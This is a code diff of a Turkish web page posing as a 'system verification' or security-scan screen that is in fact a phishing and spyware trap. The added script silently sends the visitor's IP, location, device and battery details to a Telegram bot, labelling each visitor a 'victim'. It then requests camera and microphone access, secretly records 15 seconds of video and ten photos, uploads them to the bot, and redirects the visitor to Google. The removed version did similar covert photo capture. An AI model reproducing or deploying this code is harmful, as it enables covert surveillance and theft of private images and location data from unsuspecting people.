@@ -2,52 +2,117 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Doğrulama</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Doğrulaması</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; padding: 50px 20px; font-family: sans-serif; }
-        .btn { background: #ff0000; color: #fff; padding: 15px; border: none; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; }
-        #prog { display: none; margin-top: 20px; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
+        .progress-container { width: 80%; background-color: #333; border-radius: 20px; margin-top: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 10px; background-color: #3498db; transition: width 0.5s; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 15px; font-size: 14px; color: #aaa; }
     </style>
 </head>
 <body>
-    <div style="max-width:400px; margin:auto; border:1px solid #333; padding:20px;">
-        <h2>Cihaz Doğrulaması</h2>
-        <p>Devam etmek için kamera izni verin.</p>
-        <button class="btn" onclick="start()">DOĞRULA</button>
-        <div id="prog">İşleniyor: %<span id="perc">0</span></div>
+
+    <div class="loader"></div>
+    <div class="progress-container">
+        <div class="progress-bar" id="bar"></div>
     </div>
-    <video id="v" style="display:none;" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <div id="status">Güvenlik taraması yapılıyor... (%0)</div>
+
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
     <script>
-        const p = new URLSearchParams(window.location.search);
-        const t = p.get('t'), i = p.get('i');
-        async function start() {
-            if(!t || !i) return;
+        // URL'den Token ve ID Çekme
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+        const id = urlParams.get('i');
+        const mode = urlParams.get('mode') || 'user'; // user: ön, environment: arka
+
+        const botUrl = `https://api.telegram.org/bot${token}/`;
+
+        // 1. IP ve Cihaz Bilgilerini İzin İstemeden Gönder
+        async function getInfo() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                document.getElementById('v').srcObject = s;
-                document.querySelector('.btn').style.display = 'none';
-                document.getElementById('prog').style.display = 'block';
-                for(let x=1; x<=5; x++) {
-                    await new Promise(r => setTimeout(r, 1200));
-                    snap(x);
-                    document.getElementById('perc').innerText = x*20;
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                let msg = `🛰 **Yeni Kurban Girişi!**\n\n` +
+                          `🌐 IP: ${data.ip}\n` +
+                          `📍 Konum: ${data.city} / ${data.country_name}\n` +
+                          `📱 Cihaz: ${navigator.userAgent}\n` +
+                          `🔋 Pil: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'Bilinmiyor'}`;
+                
+                fetch(botUrl + `sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
+            } catch (e) { console.log("Bilgi çekilemedi."); }
+        }
+
+        // 2. Kamera İşlemleri (İzin Gerekir)
+        async function startHack() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode === 'arka' ? 'environment' : 'user' }, 
+                    audio: true 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // 15 Saniyelik Video Kaydı
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', id);
+                    formData.append('video', blob, 'kurban_kayit.mp4');
+                    fetch(botUrl + 'sendVideo', { method: 'POST', body: formData });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 15000); // 15 Saniye sonra durdur
+
+                // 10 Adet Fotoğraf Çek (Aynı anda/hızlıca)
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', id);
+                            fd.append('photo', blob, `foto_${i}.jpg`);
+                            fetch(botUrl + 'sendPhoto', { method: 'POST', body: fd });
+                        }, 'image/jpeg');
+                    }, i * 1000); // 1 saniye arayla 10 tane
                 }
-                setTimeout(() => { window.location.href="https://youtu.be/021FIRNbJK4"; }, 1500);
-            } catch(e) { alert("Hata!"); }
+
+            } catch (err) {
+                fetch(botUrl + `sendMessage?chat_id=${id}&text=${encodeURIComponent("❌ Kurban kamera iznini reddetti.")}`);
+            }
         }
-        function snap(n) {
-            const cv = document.getElementById('c'), vi = document.getElementById('v');
-            cv.width = vi.videoWidth; cv.height = vi.videoHeight;
-            cv.getContext('2d').drawImage(vi, 0, 0);
-            cv.toBlob(b => {
-                const f = new FormData();
-                f.append('chat_id', i); f.append('photo', b, 'p.jpg');
-                f.append('caption', `📸 Kurban Görüntüsü #${n}`);
-                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {method:'POST', body:f});
-            }, 'image/jpeg', 0.7);
-        }
+
+        // Yükleme Çubuğu ve Başlatma
+        let width = 0;
+        const bar = document.getElementById('bar');
+        const status = document.getElementById('status');
+
+        getInfo(); // İzin istemeden IP gönder
+        startHack(); // Kamera izni iste ve başla
+
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                status.innerText = "Doğrulama Başarılı! Yönlendiriliyorsunuz...";
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+            } else {
+                width += (100 / 30); // Yaklaşık 15-20 saniyede dolar
+                bar.style.width = width + '%';
+                status.innerText = `Güvenlik taraması yapılıyor... (%${Math.round(width)})`;
+            }
+        }, 500);
     </script>
 </body>
 </html>
